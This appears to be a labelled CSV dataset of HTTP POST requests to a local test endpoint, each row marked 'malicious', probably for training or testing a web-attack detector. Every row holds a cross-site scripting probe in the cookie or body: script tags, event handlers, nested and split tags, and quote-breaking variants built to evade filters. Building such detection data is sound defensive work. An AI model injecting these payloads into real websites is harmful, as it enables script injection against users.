method,url,uri,query,headers,body,type
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>console.log(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>confirm(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>prompt(299792458)</script>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>alert(299792458)</script><'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>console.log(299792458)</script><'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>confirm(299792458)</script><'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='><script>prompt(299792458)</script><'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRIPT>alert(299792458);</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRIPT>console.log(299792458);</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRIPT>confirm(299792458);</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRIPT>prompt(299792458);</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<script>pt>alert(299792458);</scr</script>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<script>pt>console.log(299792458);</scr</script>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<script>pt>confirm(299792458);</scr</script>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<script>pt>prompt(299792458);</scr</script>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRI<script>PT>alert(299792458);</SCR</script>IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRI<script>PT>console.log(299792458);</SCR</script>IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRI<script>PT>confirm(299792458);</SCR</script>IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCRI<script>PT>prompt(299792458);</SCR</script>IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<scr<script>ipt>pt>alert(299792458);</scr</sc</script>ript>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<scr<script>ipt>pt>console.log(299792458);</scr</sc</script>ript>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<scr<script>ipt>pt>confirm(299792458);</scr</sc</script>ript>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<scri<scr<script>ipt>pt>prompt(299792458);</scr</sc</script>ript>ipt>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c="";alert(299792458);""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c="";console.log(299792458);""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c="";confirm(299792458);""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c="";prompt(299792458);""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=';alert(299792458);'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=';console.log(299792458);'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=';confirm(299792458);'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=';prompt(299792458);'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=;alert(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=;console.log(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=;confirm(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=;prompt(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=alert(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=console.log(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=confirm(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=prompt(299792458);
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCR%00IPT>alert(299792458)</SCR%00IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCR%00IPT>console.log(299792458)</SCR%00IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCR%00IPT>confirm(299792458)</SCR%00IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<SCR%00IPT>prompt(299792458)</SCR%00IPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=\"";alert(299792458);//
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=\"";console.log(299792458);//
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=\"";confirm(299792458);//
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=\"";prompt(299792458);//
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<STYLE TYPE=""text/javascript"">alert(299792458);</STYLE>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<STYLE TYPE=""text/javascript"">console.log(299792458);</STYLE>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<STYLE TYPE=""text/javascript"">confirm(299792458);</STYLE>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<STYLE TYPE=""text/javascript"">prompt(299792458);</STYLE>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>alert(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>console.log(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>confirm(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>prompt(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmousemove=alert(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseout=alert(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseover=alert(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmousemove=console.log(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseout=console.log(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseover=console.log(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmousemove=confirm(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseout=confirm(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseover=confirm(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmousemove=prompt(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseout=prompt(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""onmouseover=prompt(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>alert(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>console.log(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>confirm(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<<SCRIPT>prompt(299792458)//<</SCRIPT>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src=""1"" onerror=""alert(299792458)"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src=""1"" onerror=""console.log(299792458)"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src=""1"" onerror=""confirm(299792458)"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src=""1"" onerror=""prompt(299792458)"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src='1' onerror='alert(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src='1' onerror='console.log(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src='1' onerror='confirm(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<img src='1' onerror='prompt(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror=""alert(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror=""console.log(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror=""confirm(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror=""prompt(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror='alert(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror='console.log(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror='confirm(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onerror='prompt(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload=""alert(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload=""console.log(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload=""confirm(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload=""prompt(299792458)""
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload='alert(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload='console.log(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload='confirm(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=onload='prompt(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG """"""><SCRIPT>alert(299792458)</SCRIPT>"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG """"""><SCRIPT>console.log(299792458)</SCRIPT>"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG """"""><SCRIPT>confirm(299792458)</SCRIPT>"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG """"""><SCRIPT>prompt(299792458)</SCRIPT>"">
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG '''><SCRIPT>alert(299792458)</SCRIPT>'>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG '''><SCRIPT>console.log(299792458)</SCRIPT>'>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG '''><SCRIPT>confirm(299792458)</SCRIPT>'>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IMG '''><SCRIPT>prompt(299792458)</SCRIPT>'>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""""""><SCRIPT>alert(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""""""><SCRIPT>console.log(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""""""><SCRIPT>confirm(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=""""""><SCRIPT>prompt(299792458)
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='''><SCRIPT>alert(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='''><SCRIPT>console.log(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='''><SCRIPT>confirm(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c='''><SCRIPT>prompt(299792458)'
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror=""alert(299792458)""></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror=""console.log(299792458)""></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror=""confirm(299792458)""></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror=""prompt(299792458)""></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror='alert(299792458)'></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror='console.log(299792458)'></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror='confirm(299792458)'></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=<IFRAME SRC='f' onerror='prompt(299792458)'></IFRAME>
Content-Length: 17
Connection: keep-alive
Host: 127.0.0.1:8080",p3=p3val&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 45
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<script>alert(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 51
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<script>console.log(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 47
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<script>confirm(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 46
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<script>prompt(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 47
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scr ipt>alert(299792458)</scr ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 53
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scr ipt>console.log(299792458)</scr ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scr ipt>confirm(299792458)</scr ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 48
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scr ipt>prompt(299792458)</scr ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 47
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>alert(299792458)</script>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 53
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>console.log(299792458)</script>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>confirm(299792458)</script>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 48
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>prompt(299792458)</script>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>alert(299792458)</script><""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 55
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>console.log(299792458)</script><""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 51
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>confirm(299792458)</script><""&p4=p4val",malicious
